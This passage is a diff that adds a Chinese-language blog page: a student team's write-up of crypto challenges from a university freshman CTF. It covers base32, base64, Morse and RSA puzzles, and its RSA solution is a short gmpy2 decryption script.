@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<html lang="zh">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css">
+  <!-- RSS / Atom -->
+  <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+
+  <!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.css">
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.js"></script>
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/contrib/auto-render.min.js"></script>
+  <script>
+    document.addEventListener("DOMContentLoaded", function() {
+      renderMathInElement(document.body, {
+        delimiters: [
+          {left: "$$", right: "$$", display: true},
+          {left: "\\[", right: "\\]", display: true},
+          {left: "$",  right: "$",  display: false},
+          {left: "\\(", right: "\\)", display: false}
+        ],
+        throwOnError: false,   // 避免个别符号导致整段失败
+        macros: {
+          "\\sgn": "\\operatorname{sgn}"  // 你文中用到的 sgn，统一为运算符
+        }
+      });
+    });
+  </script> -->
+    <!-- <script>
+      window.MathJax = {
+        tex: {
+          packages: {'[+]': ['ams']},   // cases / aligned 需要 ams
+          inlineMath: [['$', '$'], ['\\(', '\\)']],
+          displayMath: [['$$','$$'], ['\\[','\\]']],
+          tags: 'ams'
+        },
+        options: { skipHtmlTags: ['script','style','textarea','pre','code'] }
+      };
+    </script>
+    <script async id="MathJax-script"
+            src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script> -->
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <title>现充|junyu33</title>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div class="head-nav">
+	<div class="inner">
+		<a href="/">
+			现充|junyu33
+		</a>
+		<div class="right">
+			
+				<a href="/zh">首页</a>
+				<a href="/zh/archives">归档</a>
+				
+					<a href="/zh/categories">Categories</a>
+				
+				
+					<a href="/zh/tags">Tags</a>
+				
+				<a href="/">English</a>
+			
+		</div>
+	</div>
+</div>
+
+  <div class="main">
+    <div class="post">
+    
+
+	<h1>scuctf新生赛——幽篁终见天战队wp</h1>
+	<p>这场新生赛题目质量不错，我们“幽篁终见天”战队的每位成员都发挥了自己的长处，在比赛中玩得很尽兴。以下是排行榜截图和战队wp：</p>
+<img src="https://img.junyu33.me/blog/ctf04/rank.jpg" style="zoom:50%;" >
+<span id="more"></span>
+<h1>WriteUp from junyu33</h1>
+<h2 id="Crypto-1-singin-Classic">Crypto-1:singin_Classic</h2>
+<p>HAZTMNZYGU3DOOBUG4YDCMRTHA3DKMBYGYYTCNJYHE2TANJXGEYTMOJQHA3DKNZUHA4TQNBZGU3TQNBYGE2DSOBWGY4DQNRWHE4DSMJQGQYTENI=</p>
+<p>(base32)</p>
+<p>836785678470123865086115895057116908657489849578481498668866989104125</p>
+<p>(ascii)</p>
+<p>83 67 85 67 84 70 123 86 50 86 115 89 50 57 116 90 86 57 48 98 49 57 84 81 49 86 68 86 69 89 104 125</p>
+<p>SCUCTF{V2VsY29tZV90b19TQ1VDVEYh}</p>
+<p>(base64)</p>
+<p>SCUCTF{Welcome_to_SCUCTF!}</p>
+<h2 id="Crypto-2-ez-classic">Crypto-2:ez_classic</h2>
+<p>打开文件是一串01编码，根据提示可知密文的读法是两行交错来读（我开始以为W型指栅栏密码），可以使用脚本先读奇数位，再读偶数位。</p>
+<p>之后的01串转成ascii，每八个分成一组，再打印十进制数值，得到了210与226两个数，猜想又是一种01串，长度为72。</p>
+<p>如果把72再转成ascii，长度就只有9了，显然不可能。考虑morse，我们把210看成0，226看成1，试一下前几位，并没有看到有意义的文字。然而把210看成1，226看成0，就得到了以下图片：</p>
+<img src="https://img.junyu33.me/blog/ctf04/crypto2.png">
+<p>但是最难的地方是：<strong>morse不是非前缀编码，这就意味着不能在线性的时间内解密出原文，而且一个密文可以对应多个原文！</strong></p>
+<p>（你看，flag中就没有tql的字段，但是我就推出来了）</p>
+<p>经过与出题人的亲切交流，他告诉了我中间大部分的原文，然后剩下的只能靠暴搜解决了。</p>
+<p>题目出得不是特别好。</p>
+<p>SCUCTF{B1N?F3NCE!}</p>
+<h2 id="Crypto-3-number-theory">Crypto-3:number_theory</h2>
+<p>真·数学题</p>
+<p>题目的意思是，找p,q,r,s，使等式</p>
+<mjx-container class="MathJax" jax="SVG" display="true" style="direction: ltr; display: block; text-align: center; margin: 1em 0; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="57.054ex" height="2.565ex" role="img" focusable="false" viewBox="0 -883.9 25217.9 1133.9" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(389,0)"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(562,413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mo" transform="translate(1576.8,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(2577,0)"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(462,413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mo" transform="translate(3664.8,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(4665,0)"><g data-mml-node="mi"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(466,413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mo" transform="translate(5756.8,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(6757,0)"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(553,413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mo" transform="translate(7713.5,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(8102.5,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(8491.5,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(605,413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mo" transform="translate(9722.3,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(10722.5,0)"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(523,413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mo" transform="translate(11871.3,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(12871.5,0)"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(498,413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mo" transform="translate(13995.3,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(14995.5,0)"><g data-mml-node="mi"><path data-c="1D464" d="M580 385Q580 406 599 424T641 443Q659 443 674 425T690 368Q690 339 671 253Q656 197 644 161T609 80T554 12T482 -11Q438 -11 404 5T355 48Q354 47 352 44Q311 -11 252 -11Q226 -11 202 -5T155 14T118 53T104 116Q104 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Q21 293 29 315T52 366T96 418T161 441Q204 441 227 416T250 358Q250 340 217 250T184 111Q184 65 205 46T258 26Q301 26 334 87L339 96V119Q339 122 339 128T340 136T341 143T342 152T345 165T348 182T354 206T362 238T373 281Q402 395 406 404Q419 431 449 431Q468 431 475 421T483 402Q483 389 454 274T422 142Q420 131 420 107V100Q420 85 423 71T442 42T487 26Q558 26 600 148Q609 171 620 213T632 273Q632 306 619 325T593 357T580 385Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(749,413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mo" transform="translate(16148.1,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(16814.9,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(17870.6,0)"><g data-mml-node="mi"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(536,413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mo" transform="translate(19032.4,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(20032.6,0)"><g data-mml-node="mi"><path data-c="1D45E" d="M33 157Q33 258 109 349T280 441Q340 441 372 389Q373 390 377 395T388 406T404 418Q438 442 450 442Q454 442 457 439T460 434Q460 425 391 149Q320 -135 320 -139Q320 -147 365 -148H390Q396 -156 396 -157T393 -175Q389 -188 383 -194H370Q339 -192 262 -192Q234 -192 211 -192T174 -192T157 -193Q143 -193 143 -185Q143 -182 145 -170Q149 -154 152 -151T172 -148Q220 -148 230 -141Q238 -136 258 -53T279 32Q279 33 272 29Q224 -10 172 -10Q117 -10 75 30T33 157ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(543.7,413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mo" transform="translate(21202.1,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(22202.3,0)"><g data-mml-node="mi"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(484,413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mo" transform="translate(23312.1,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(24312.3,0)"><g data-mml-node="mi"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(502,413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" style="stroke-width: 3;"/></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; overflow: hidden; width: 100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mo stretchy="false">(</mo><msup><mi>a</mi><mn>2</mn></msup><mo>+</mo><msup><mi>b</mi><mn>2</mn></msup><mo>+</mo><msup><mi>c</mi><mn>2</mn></msup><mo>+</mo><msup><mi>d</mi><mn>2</mn></msup><mo stretchy="false">)</mo><mo stretchy="false">(</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><msup><mi>y</mi><mn>2</mn></msup><mo>+</mo><msup><mi>z</mi><mn>2</mn></msup><mo>+</mo><msup><mi>w</mi><mn>2</mn></msup><mo stretchy="false">)</mo><mo>=</mo><msup><mi>p</mi><mn>2</mn></msup><mo>+</mo><msup><mi>q</mi><mn>2</mn></msup><mo>+</mo><msup><mi>r</mi><mn>2</mn></msup><mo>+</mo><msup><mi>s</mi><mn>2</mn></msup></math></mjx-assistive-mml></mjx-container><p>恒成立。</p>
+<p>我的第一直觉是去问一个数学好的人，于是我求教了今年丘成桐女子中学生数学竞赛金奖的得主。</p>
+<img src="https://img.junyu33.me/blog/ctf04/crypto3_1.png">
+<p>（真正学数学的怎么会搞这种无聊的东西qwq）</p>
+<p>于是我在Wikipedia上找到了答案，欧拉太强了！！！</p>
+<img src="https://img.junyu33.me/blog/ctf04/crypto3.png">
+<h2 id="Crypto-4-ez-RSA">Crypto-4:ez_RSA</h2>
+<p>Rsa模板题。了解rsa原理的，并且经历了python装插件这个难关的，都能做出来。</p>
+<pre><code class="language-python">import gmpy2
+p = 213043791008118001973620295219389127641
+q = 288394236514907373490429135931237985191
+e = 65537
+n = p * q
+c = 2064504307456306488731553002068102151545513181275073778820466336566521706326 
+d = gmpy2.invert(e,(p-1)*(q-1))
+m = gmpy2.powmod(c,d,p*q)
+print (hex(m)[2:].decode('hex'))
+</code></pre>
+<h2 id="Crypto-5-strange-RSA">Crypto-5:strange_RSA</h2>
+<p>n可以用factordb直接分解。</p>
+<p>至于e与φ(n)不互素的问题，可以使用中国剩余定理求解，具体参考以下链接。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ustclug/hackergame2019-writeups/blob/master/official/%E5%8D%81%E6%AC%A1%E6%96%B9%E6%A0%B9/README.md">https://github.com/ustclug/hackergame2019-writeups/blob/master/official/%E5%8D%81%E6%AC%A1%E6%96%B9%E6%A0%B9/README.md</a></p>
+<img src="https://img.junyu33.me/blog/ctf04/crypto5.png">
+<h2 id="Crypto-7-Elliptic-Curve">Crypto-7:Elliptic Curve</h2>
